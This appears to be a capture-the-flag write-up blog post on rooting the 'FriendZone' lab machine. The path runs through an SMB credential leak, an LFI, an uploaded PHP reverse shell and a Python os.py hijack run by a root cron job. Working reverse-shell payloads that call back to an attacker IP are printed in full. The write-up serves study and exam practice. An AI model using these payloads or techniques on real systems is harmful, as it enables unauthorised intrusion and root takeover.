---
layout: post
title: "friendzone"
date: 2025-09-24 
categories: OSCP Playlist
---
# freindzone

# Summary

- nmap reveal domain name through DNS certificate in the common name section
- use dig to execute a zone transfer to get sub domains
- smb allow null authentication to find admin credential
- visit admin subdomain and login
- dashboard.php reveal LFI vulnerability
- nmap --script smb-enum-shares.ns or finding similarities between comments on the smb shares from nxc reveal full path of Development, which have world writable permissions
- write php reverse shell and write to Development dir, and use LFI vuln to include our php rev shell page to execute
- password reuse in sql config file
- linpeas reveal world writable files, including python os script
- pspy reveal cron job running in background as root, which execute script including the importation of os
- inject python reverse shell to os.py, start listener, get root

# Attack Path

First enumerate the open ports and services:

```bash
sudo nmap -sC -sV -oN nmap/freindzone 10.10.10.123

21/tcp  open  ftp         vsftpd 3.0.3
22/tcp  open  ssh         OpenSSH 7.6p1 Ubuntu 4 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 a9:68:24:bc:97:1f:1e:54:a5:80:45:e7:4c:d9:aa:a0 (RSA)
|   256 e5:44:01:46:ee:7a:bb:7c:e9:1a:cb:14:99:9e:2b:8e (ECDSA)
|_  256 00:4e:1a:4f:33:e8:a0:de:86:a6:e4:2a:5f:84:61:2b (ED25519)
53/tcp  open  domain      ISC BIND 9.11.3-1ubuntu1.2 (Ubuntu Linux)
| dns-nsid: 
|_  bind.version: 9.11.3-1ubuntu1.2-Ubuntu
80/tcp  open  http        Apache httpd 2.4.29 ((Ubuntu))
|_http-title: Friend Zone Escape software
|_http-server-header: Apache/2.4.29 (Ubuntu)
139/tcp open  netbios-ssn Samba smbd 3.X - 4.X (workgroup: WORKGROUP)
443/tcp open  ssl/http    Apache httpd 2.4.29
|_http-server-header: Apache/2.4.29 (Ubuntu)
| tls-alpn: 
|_  http/1.1
|_ssl-date: TLS randomness does not represent time
|_http-title: 404 Not Found
| ssl-cert: Subject: commonName=friendzone.red/organizationName=CODERED/stateOrProvinceName=CODERED/countryName=JO
| Not valid before: 2018-10-05T21:02:30
|_Not valid after:  2018-11-04T21:02:30
445/tcp open  netbios-ssn Samba smbd 4.7.6-Ubuntu (workgroup: WORKGROUP)
Service Info: Hosts: FRIENDZONE, 127.0.1.1; OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel

Host script results:
| smb-os-discovery: 
|   OS: Windows 6.1 (Samba 4.7.6-Ubuntu)
|   Computer name: friendzone
|   NetBIOS computer name: FRIENDZONE\x00
|   Domain name: \x00
|   FQDN: friendzone
|_  System time: 2025-09-24T12:21:04+03:00
|_clock-skew: mean: -59m57s, deviation: 1h43m55s, median: 1s
| smb2-time: 
|   date: 2025-09-24T09:21:04
|_  start_date: N/A
| smb-security-mode: 
|   account_used: guest
|   authentication_level: user
|   challenge_response: supported
|_  message_signing: disabled (dangerous, but default)
| smb2-security-mode: 
|   3:1:1: 
|_    Message signing enabled but not required
|_nbstat: NetBIOS name: FRIENDZONE, NetBIOS user: <unknown>, NetBIOS MAC: <unknown> (unknown)

```

From the port scan, we know the web server is apache and the backend is Ubuntu. The common name on the TLS certificate says friendzone.red. Let’s add that to our /etc/hosts.

Since DNS is up, let’s try reverse lookup to try and verify the domain name:

```bash
dig @10.10.10.123 -x 10.10.10.123

#let's try zone transfer
dig axfr friendzone.red @10.10.10.123

; <<>> DiG 9.20.9-1-Debian <<>> axfr friendzone.red @10.10.10.123
;; global options: +cmd
friendzone.red.         604800  IN      SOA     localhost. root.localhost. 2 604800 86400 2419200 604800
friendzone.red.         604800  IN      AAAA    ::1
friendzone.red.         604800  IN      NS      localhost.
friendzone.red.         604800  IN      A       127.0.0.1
administrator1.friendzone.red. 604800 IN A      127.0.0.1
hr.friendzone.red.      604800  IN      A       127.0.0.1
uploads.friendzone.red. 604800  IN      A       127.0.0.1
friendzone.red.         604800  IN      SOA     localhost. root.localhost. 2 604800 86400 2419200 604800

```

Let’s add the new subdomains to our /etc/hosts file:

```bash
administrator1.friendzone.red hr.friendzone.red uploads.friendzone.red
```

Let’s check if the ftp server allow anon login:

```bash
ftp 10.10.10.123
```

Denied.

Let’s see if smb allow Null authentication:

```bash
nxc smb 10.10.10.123 -u '' -p '' --shares

SMB         10.10.10.123    445    FRIENDZONE       [*] Enumerated shares
SMB         10.10.10.123    445    FRIENDZONE       Share           Permissions     Remark
SMB         10.10.10.123    445    FRIENDZONE       -----           -----------     ------
SMB         10.10.10.123    445    FRIENDZONE       print$                          Printer Drivers
SMB         10.10.10.123    445    FRIENDZONE       Files                           FriendZone Samba Server Files /etc/Files
SMB         10.10.10.123    445    FRIENDZONE       general         READ            FriendZone Samba Server Files
SMB         10.10.10.123    445    FRIENDZONE       Development     READ,WRITE      FriendZone Samba Server Files
SMB         10.10.10.123    445    FRIENDZONE       IPC$                            IPC Service (FriendZone server (Samba, Ubuntu))

```

```bash
nxc smb 10.10.10.123 -u '' -p '' --spider Development -- regex .

SMB         10.10.10.123    445    FRIENDZONE       [*] Unix - Samba (name:FRIENDZONE) (domain:) (signing:False) (SMBv1:True)                            
SMB         10.10.10.123    445    FRIENDZONE       [+] \: (Guest)                                                                                       
SMB         10.10.10.123    445    FRIENDZONE       [*] Started spidering                                                                                
SMB         10.10.10.123    445    FRIENDZONE       [*] Spidering .                                                                                      
SMB         10.10.10.123    445    FRIENDZONE       //10.10.10.123/Development/. [dir]                                                                   
SMB         10.10.10.123    445    FRIENDZONE       //10.10.10.123/Development/.. [dir]                                                                  
SMB         10.10.10.123    445    FRIENDZONE       [*] Done spidering (Completed in 0.09617900848388672) 

nxc smb 10.10.10.123 -u '' -p '' --spider general --regex .

SMB         10.10.10.123    445    FRIENDZONE       [*] Unix - Samba (name:FRIENDZONE) (domain:) (signing:False) (SMBv1:True)                            
SMB         10.10.10.123    445    FRIENDZONE       [+] \: (Guest)                                                                                       
SMB         10.10.10.123    445    FRIENDZONE       [*] Started spidering                                                                                
SMB         10.10.10.123    445    FRIENDZONE       [*] Spidering .                                                                                      
SMB         10.10.10.123    445    FRIENDZONE       //10.10.10.123/general/. [dir]                                                                       
SMB         10.10.10.123    445    FRIENDZONE       //10.10.10.123/general/.. [dir]                                                                      
SMB         10.10.10.123    445    FRIENDZONE       //10.10.10.123/general/creds.txt [lastm:'2018-10-10 00:52' size:57]                                  
SMB         10.10.10.123    445    FRIENDZONE       [*] Done spidering (Completed in 0.09600543975830078) 

nxc smb 10.10.10.123 -u '' -p '' --share general --get-file creds.txt

SMB         10.10.10.123    445    FRIENDZONE       [*] Unix - Samba (name:FRIENDZONE) (domain:) (signing:False) (SMBv1:True) 
SMB         10.10.10.123    445    FRIENDZONE       [+] \: (Guest)
SMB         10.10.10.123    445    FRIENDZONE       [*] Copying "creds.txt" to "creds.txt"
SMB         10.10.10.123    445    FRIENDZONE       [+] File "creds.txt" was downloaded to "creds.txt"

```

Content of creds.txt:

```bash
creds for the admin THING:

admin:WORKWORKHhallelujah@#
```

Let’s see if the credential work for SMB:

```bash
nxc smb 10.10.10.123 -u admin -p 'WORKWORKHhallelujah@#' --shares

SMB         10.10.10.123    445    FRIENDZONE       [+] \admin:WORKWORKHhallelujah@# (Guest)
SMB         10.10.10.123    445    FRIENDZONE       Share           Permissions     Remark
SMB         10.10.10.123    445    FRIENDZONE       -----           -----------     ------
SMB         10.10.10.123    445    FRIENDZONE       print$                          Printer Drivers
SMB         10.10.10.123    445    FRIENDZONE       Files                           FriendZone Samba Server Files /etc/Files
SMB         10.10.10.123    445    FRIENDZONE       general         READ            FriendZone Samba Server Files
SMB         10.10.10.123    445    FRIENDZONE       Development     READ,WRITE      FriendZone Samba Server Files
SMB         10.10.10.123    445    FRIENDZONE       IPC$                            IPC Service (FriendZone server (Samba, Ubuntu))

```

Same permissions. Let’s see if the ftp server have more files:

```bash
ftp 10.10.10.123 
```

Denied.

Let’s visit the web page now:

![image.png]({{ site.baseurl }}/assets/friendzone/image.png)

Not much in the source code either.

Let’s fuzz the main site:

```bash
ffuf -w /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt:FUZZ -u http://10.10.10.123/FUZZ -ic

                        [Status: 200, Size: 324, Words: 26, Lines: 13, Duration: 1339ms]
wordpress               [Status: 301, Size: 316, Words: 20, Lines: 10, Duration: 22ms]
                        [Status: 200, Size: 324, Words: 26, Lines: 13, Duration: 19ms]
server-status           [Status: 403, Size: 300, Words: 22, Lines: 12, Duration: 16ms]
```

![image.png]({{ site.baseurl }}/assets/friendzone/image%201.png)

Lets’ visit https:

![image.png]({{ site.baseurl }}/assets/friendzone/image%202.png)

Viewing the source code:

```bash
<title>FriendZone escape software</title>

<br>
<br>

<center><h2>Ready to escape from friend zone !</h2></center>

<center><img src="e.gif"></center>

<!-- Just doing some development here -->
<!-- /js/js -->
<!-- Don't go deep ;) -->

```

Let’s visit the site:

```bash
https://friendzone.red/js/js

Testing some functions !

I'am trying not to break things !
VmRUdE9EY3JmRjE3NTg3MTM0NzlVekZmWU8yd2pB
```

Let’s move on for now. Let’s visit the administrator subdomain:

```bash
https://administrator1.friendzone.red
```

![image.png]({{ site.baseurl }}/assets/friendzone/image%203.png)

Let’s try logging in with the cred we found earlier:

![image.png]({{ site.baseurl }}/assets/friendzone/image%204.png)

![image.png]({{ site.baseurl }}/assets/friendzone/image%205.png)

Let’s input the default parameters:

```bash
https://administrator1.friendzone.red/dashboard.php?image_id=a.jpg&pagename=timestamp
```

![image.png]({{ site.baseurl }}/assets/friendzone/image%206.png)

We see at the bottom left, there is a UNIX timestamp the equates to the time we visited this site. Let’s fuzz for other pages:

```bash
ffuf -w /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt:FUZZ -u https://administrator1.friendzone.red/FUZZ -ic -e .php

.php                    [Status: 403, Size: 309, Words: 22, Lines: 12, Duration: 26ms]
                        [Status: 200, Size: 2873, Words: 393, Lines: 123, Duration: 23ms]
images                  [Status: 301, Size: 349, Words: 20, Lines: 10, Duration: 26ms]
login.php               [Status: 200, Size: 7, Words: 2, Lines: 1, Duration: 24ms]
dashboard.php           [Status: 200, Size: 101, Words: 12, Lines: 1, Duration: 15ms]
timestamp.php           [Status: 200, Size: 36, Words: 5, Lines: 1, Duration: 25ms]
```

Let’s visit timestamp.php

```bash
https://administrator1.friendzone.red/timestamp.php
```

This means that the dashboard page will include a file and add a .php extension to it. Let’s try reading the source code of timestamp with php filter:

```bash
https://administrator1.friendzone.red/dashboard.php?image_id=a.jpg&pagename=php://filter/read=convert.base64-encode/resource=timestamp
```

Now base64 decode it:

```bash
echo 'PD9waHAKCgokdGltZV9maW5hbCA9IHRpbWUoKSArIDM2MDA7CgplY2hvICJGaW5hbCBBY2Nlc3MgdGltZXN0YW1wIGlzICR0aW1lX2ZpbmFsIjsKCgo/Pgo=' | base64 -d 
```

```bash
<?php

$time_final = time() + 3600;

echo "Final Access timestamp is $time_final";

?>
```

Now let’s read dashboard:

```bash
https://administrator1.friendzone.red/dashboard.php?image_id=a.jpg&pagename=php://filter/read=convert.base64-encode/resource=dashboard
```

dashboard.php:

```bash
<?php

//echo "<center><h2>Smart photo script for friendzone corp !</h2></center>";
//echo "<center><h3>* Note : we are dealing with a beginner php developer and the application is not tested yet !</h3></center>";
echo "<title>FriendZone Admin !</title>";
$auth = $_COOKIE["FriendZoneAuth"];

if ($auth === "e7749d0f4b4da5d03e6e9196fd1d18f1"){
 echo "<br><br><br>";

echo "<center><h2>Smart photo script for friendzone corp !</h2></center>";
echo "<center><h3>* Note : we are dealing with a beginner php developer and the application is not tested yet !</h3></center>";

if(!isset($_GET["image_id"])){
  echo "<br><br>";
  echo "<center><p>image_name param is missed !</p></center>";
  echo "<center><p>please enter it to show the image</p></center>";
  echo "<center><p>default is image_id=a.jpg&pagename=timestamp</p></center>";
 }else{
 $image = $_GET["image_id"];
 echo "<center><img src='images/$image'></center>";

 echo "<center><h1>Something went worng ! , the script include wrong param !</h1></center>";
 include($_GET["pagename"].".php");
 //echo $_GET["pagename"];
 }
}else{
echo "<center><p>You can't see the content ! , please login !</center></p>";
}
?>
```

Maybe we can upload a file and get it to execute php code? Let’s visit the upload subdomain:

```bash
https://uploads.friendzone.red
```

![image.png]({{ site.baseurl }}/assets/friendzone/image%207.png)

After clicking upload, we get:

```bash
Uploaded successfully !
1758717568
```

Searching up the number, it seems like it’s a UNIX time stamp:

`1758717568` in Unix epoch time → corresponds to:

- **Date:** Sunday, September 24, 2025
- **Time (UTC):** 07:39:28

Let’s go back to the dashboard and try viewing the image:

```bash
https://administrator1.friendzone.red/dashboard.php?image_id=test.jpg&pagename=1758717568
```

![image.png]({{ site.baseurl }}/assets/friendzone/image%208.png)

Let’s view the page source:

```bash
<SNIP></center><center><img src='images/test.jpg'></center><SNIP>

#follow the hyperlink
```

![image.png]({{ site.baseurl }}/assets/friendzone/image%209.png)

We visit the /images dir:

![image.png]({{ site.baseurl }}/assets/friendzone/image%2010.png)

We convert the time to a unix timestamp and visit the dashboard again:

```bash
https://administrator1.friendzone.red/dashboard.php?image_id=a.jpg&pagename=1441034040
```

![image.png]({{ site.baseurl }}/assets/friendzone/image%2011.png)

Let’s view the page source for upload.php:

```bash
#the upload funciton page
https://uploads.friendzone.red/upload.php
```

To read; we guess the basic VHOST file dir is the subdomain name is the dir that includes all its files:

```bash
https://administrator1.friendzone.red/dashboard.php?image_id=a.jpg&pagename=php://filter/read=convert.base64-encode/resource=../uploads/upload
```

![image.png]({{ site.baseurl }}/assets/friendzone/image%2012.png)

Let’s decode:

```bash
<?php

// not finished yet -- friendzone admin !

if(isset($_POST["image"])){

echo "Uploaded successfully !<br>";
echo time()+3600;
}else{

echo "WHAT ARE YOU TRYING TO DO HOOOOOOMAN !";

}

?>
```

It doesn’t look like it’s actually uploading anything.

Thinking back when we were enumerating the smb shares, we got:

```bash
SMB         10.10.10.123    445    FRIENDZONE       [*] Enumerated shares
SMB         10.10.10.123    445    FRIENDZONE       Share           Permissions     Remark
SMB         10.10.10.123    445    FRIENDZONE       -----           -----------     ------
SMB         10.10.10.123    445    FRIENDZONE       print$                          Printer Drivers
SMB         10.10.10.123    445    FRIENDZONE       Files                           FriendZone Samba Server Files /etc/Files
SMB         10.10.10.123    445    FRIENDZONE       general         READ            FriendZone Samba Server Files
SMB         10.10.10.123    445    FRIENDZONE       Development     READ,WRITE      FriendZone Samba Server Files
SMB         10.10.10.123    445    FRIENDZONE       IPC$                            IPC Service (FriendZone server (Samba, Ubuntu))
```

If Files is in /etc/Files, maybe Development is in /etc/Development. Let’s write a test file in Development and see if we can read it; remember the site appends a .php at the end of the file:

```bash
nxc smb 10.10.10.123 -u '' -p '' --share Development --put-file test.txt test.php

SMB         10.10.10.123    445    FRIENDZONE       [*] Unix - Samba (name:FRIENDZONE) (domain:) (signing:False) (SMBv1:True) 
SMB         10.10.10.123    445    FRIENDZONE       [+] \: (Guest)
SMB         10.10.10.123    445    FRIENDZONE       [*] Copying test.txt to test.php
SMB         10.10.10.123    445    FRIENDZONE       [+] Created file test.txt on \\Development\test.php

```

Now let’s try to read it:

```bash
https://administrator1.friendzone.red/dashboard.php?image_id=a.jpg&pagename=/etc/Development/test
```

![image.png]({{ site.baseurl }}/assets/friendzone/image%2013.png)

Another way to find out the full path of Development is using nmap script:

```bash
sudo nmap --script smb-enum-shares.nse 10.10.10.123

Host script results:
| smb-enum-shares:
|   account_used: guest
|   \\10.10.10.123\Development:
|     Type: STYPE_DISKTREE
|     Comment: FriendZone Samba Server Files
|     Users: 0
|     Max Users: <unlimited>
|     Path: C:\etc\Development
|     Anonymous access: READ/WRITE
|     Current user access: READ/WRITE
|   \\10.10.10.123\Files:
|     Type: STYPE_DISKTREE
|     Comment: FriendZone Samba Server Files /etc/Files
|     Users: 0
|     Max Users: <unlimited>
|     Path: C:\etc\hole
|     Anonymous access: <none>
|     Current user access: <none>
|   \\10.10.10.123\IPC$:
|     Type: STYPE_IPC_HIDDEN
|     Comment: IPC Service (FriendZone server (Samba, Ubuntu))
|     Users: 1
|     Max Users: <unlimited>
|     Path: C:\tmp
|     Anonymous access: READ/WRITE
|     Current user access: READ/WRITE
|   \\10.10.10.123\general:
|     Type: STYPE_DISKTREE
|     Comment: FriendZone Samba Server Files
|     Users: 0
|     Max Users: <unlimited>
|     Path: C:\etc\general
|     Anonymous access: READ/WRITE
|     Current user access: READ/WRITE
|   \\10.10.10.123\print$:
|     Type: STYPE_DISKTREE
|     Comment: Printer Drivers
|     Users: 0
|     Max Users: <unlimited>
|     Path: C:\var\lib\samba\printers
|     Anonymous access: <none>
|_    Current user access: <none>

```

Now let’s upload a reverse shell. The following will be our payload:

```bash
<?php
$sock=fsockopen("10.10.16.7",4444);
$proc=proc_open("/bin/sh -i", array(0=>$sock, 1=>$sock, 2=>$sock), $pipes);
?>

```

Now upload it:

```bash
nxc smb 10.10.10.123 -u '' -p '' --share Development --put-file rev.php rev.php

SMB         10.10.10.123    445    FRIENDZONE       [+] \: (Guest)
SMB         10.10.10.123    445    FRIENDZONE       [*] Copying rev.php to rev.php
SMB         10.10.10.123    445    FRIENDZONE       [+] Created file rev.php on \\Development\rev.php

```

Now start a listener and visit our web page:

```bash
nc -lnvp 4444
```

```bash
https://administrator1.friendzone.red/dashboard.php?image_id=a.jpg&pagename=/etc/Development/rev
```

We now have shell.

![image.png]({{ site.baseurl }}/assets/friendzone/image%2014.png)

In www-data’s home dir, we find mysql_data.conf file:

```bash
cat mysql_data.conf

for development process this is the mysql creds for user friend

db_user=friend

db_pass=Agpyu12!0.213$

db_name=FZ

```

Let’s check if mysql is running on this server:

```bash
State    Recv-Q    Send-Q        Local Address:Port        Peer Address:Port    
LISTEN   0         10             10.10.10.123:53               0.0.0.0:*       
LISTEN   0         10                127.0.0.1:53               0.0.0.0:*       
LISTEN   0         128           127.0.0.53%lo:53               0.0.0.0:*       
LISTEN   0         128                 0.0.0.0:22               0.0.0.0:*       
LISTEN   0         20                127.0.0.1:25               0.0.0.0:*       
LISTEN   0         128               127.0.0.1:953              0.0.0.0:*       
LISTEN   0         50                  0.0.0.0:445              0.0.0.0:*       
LISTEN   0         50                  0.0.0.0:139              0.0.0.0:*       
LISTEN   0         32                        *:21                     *:*       
LISTEN   0         128                    [::]:22                  [::]:*       
LISTEN   0         20                    [::1]:25                  [::]:*       
LISTEN   0         128                       *:443                    *:*       
LISTEN   0         50                     [::]:445                 [::]:*       
LISTEN   0         50                     [::]:139                 [::]:*       
LISTEN   0         128                       *:80                     *:* 
```

It’s not. Let’s see what users are on this machine:

```bash
ls /home

friend
```

Let’s attempt to ssh in with the credential we got:

```bash
ssh friend@10.10.10.123
```

We are in:

![image.png]({{ site.baseurl }}/assets/friendzone/image%2015.png)

We are in the adm group which means we are permitted to read logs. We have no sudo privileges.

Let’s run linpeas and see what attack vectors we have.

```bash
╔══════════╣ Sudo version
╚ https://book.hacktricks.wiki/en/linux-hardening/privilege-escalation/index.html#sudo-version
Sudo version 1.8.21p2

#No point exploiting the sudo exploit, we already know it works

<VirtualHost _default_:443>
    ServerAdmin admin@example.com
    ServerName admin.friendzoneportal.red
    ServerAlias admin.friendzoneportal.red
    DocumentRoot /var/www/friendzoneportaladmin
    SSLEngine on
    SSLCertificateFile /root/certs/friendzone.red.crt
    SSLCertificateKeyFile /root/certs/friendzone.red.key
</VirtualHost>

╔══════════╣ Analyzing Interesting logs Files (limit 70)                                                                                                 
-rw-r----- 1 root adm 62703161 Sep 24 16:18 /var/log/apache2/access.log                                                                                  
                                                                                                                                                         
-rw-r----- 1 root adm 33030898 Sep 24 18:18 /var/log/apache2/error.log  

╔══════════╣ Readable files belonging to root and readable by me but not world readable
-rw-r----- 1 root adm 126423 Sep 13  2022 /var/log/apt/term.log
-rw-r----- 1 root adm 33030898 Sep 24 18:18 /var/log/apache2/error.log
-rw-r----- 1 root adm 130441454 Sep 24 18:18 /var/log/apache2/other_vhosts_access.log
-rw-r----- 1 root adm 62703161 Sep 24 16:18 /var/log/apache2/access.log

╔══════════╣ Interesting GROUP writable files (not in Home) (max 200)
╚ https://book.hacktricks.wiki/en/linux-hardening/privilege-escalation/index.html#writable-files
  Group friend:
/usr/lib/python2.7/os.pyc
  Group sambashare:
/var/lib/samba/usershares

╔══════════╣ .sh files in path
╚ https://book.hacktricks.wiki/en/linux-hardening/privilege-escalation/index.html#scriptbinaries-in-path
/usr/bin/gettext.sh

╔══════════╣ Unexpected in /opt (usually empty)
drwxr-xr-x  2 root root 4096 Sep 13  2022 server_admin

╔══════════╣ Modified interesting files in the last 5mins (limit 100)
/var/log/auth.log
/var/log/btmp
/var/log/wtmp
/var/log/kern.log
/var/log/lastlog

logrotate 3.11.0

╔══════════╣ Interesting writable files owned by me or writable by everyone (not in Home) (max 200)                                                      
╚ https://book.hacktricks.wiki/en/linux-hardening/privilege-escalation/index.html#writable-files                                                         
/dev/mqueue                                                                                                                                              
/dev/shm                                                                                                                                                 
/etc/Development                                                                                                                                         
/etc/Development/rev.php                                                                                                                                 
/etc/Development/test.php                                                                                                                                
/etc/Development/test.txt                                                                                                                                
/etc/sambafiles                                                                                                                                          
/home/friend
/run/lock
/run/user/1000
/run/user/1000/gnupg
/run/user/1000/systemd
/tmp
/tmp/.font-unix
/tmp/.ICE-unix
/tmp/.Test-unix
/tmp/.X11-unix
/tmp/.XIM-unix
/usr/lib/python2.7
/usr/lib/python2.7/os.py
/usr/lib/python2.7/os.pyc
/var/lib/php/sessions
/var/mail/friend
/var/spool/samba
/var/tmp

╔══════════╣ Interesting GROUP writable files (not in Home) (max 200)
╚ https://book.hacktricks.wiki/en/linux-hardening/privilege-escalation/index.html#writable-files
  Group friend:
/usr/lib/python2.7/os.pyc
  Group sambashare:
/var/lib/samba/usershares

```

Now, let’s also view running processes with pspy:

```bash
#First find the version of OS so we can upload a compatible pspy version
uname -a

Linux FriendZone 4.15.0-36-generic #39-Ubuntu SMP Mon Sep 24 16:19:09 UTC 2018 x86_64 x86_64 x86_64 GNU/Linux

#after researching, we find out the version is 2018

./pspy64s_2018

2025/09/24 19:54:01 CMD: UID=0    PID=20296  | /usr/sbin/CRON -f 
2025/09/24 19:54:01 CMD: UID=0    PID=20298  | /usr/bin/python /opt/server_admin/reporter.py 
2025/09/24 19:54:01 CMD: UID=0    PID=20297  | /bin/sh -c /opt/server_admin/reporter.py
```

Let’s view the content:

```bash
#!/usr/bin/python

import os

to_address = "admin1@friendzone.com"
from_address = "admin2@friendzone.com"

print "[+] Trying to send email to %s"%to_address

#command = ''' mailsend -to admin2@friendzone.com -from admin1@friendzone.com -ssl -port 465 -auth -smtp smtp.gmail.co-sub scheduled results email +cc +bc -v -user you -pass "PAPAP"'''

#os.system(command)

# I need to edit the script later
# Sam ~ python developer

```

Thinking back to our linpeas, we remember some python library files are world writable, especially the one that the program is importing; /usr/lib/python2.7/os.py

```bash
ls -l /usr/bin/python

lrwxrwxrwx 1 root root 9 Apr 16  2018 /usr/bin/python -> python2.7

```

Since python is pointing to python2.7, let’s edit OS so when it gets imported, it also executes a reverse shell:

```bash
nano /usr/lib/python2.7/os.py

#remove os and replace semi colon with newline and place the code at the very bottom
import socket,pty
s=socket.socket(socket.AF_INET,socket.SOCK_STREAM)
s.connect(("10.10.16.7",1234))
dup2(s.fileno(),0)
dup2(s.fileno(),1)
dup2(s.fileno(),2)
pty.spawn("/bin/sh")
```

Now save it and start a listener:

```bash
nc -lnvp 1234
```

We now have root shell:

![image.png]({{ site.baseurl }}/assets/friendzone/image%2016.png)